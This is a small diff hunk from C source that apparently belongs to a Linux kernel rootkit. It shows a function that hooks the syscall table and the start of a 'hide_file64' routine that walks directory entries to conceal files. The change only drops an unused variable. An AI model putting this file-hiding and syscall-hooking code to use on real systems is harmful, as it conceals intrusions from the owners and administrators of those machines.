@@ -85,7 +85,7 @@ unsigned long ** hook_syscall_table(void)
 static long hide_file64(char *f_name, struct linux_dirent64 __user *dirp, long count)
 {
     struct linux_dirent64 *dp;
-    long cur_addr, cur_reclen, size, next_addr;
+    long cur_addr, cur_reclen, next_addr;
     
     for (cur_addr = 0; cur_addr < count; cur_addr += dp->d_reclen) {
         dp = (struct linux_dirent64 *)((char *)dirp + cur_addr);
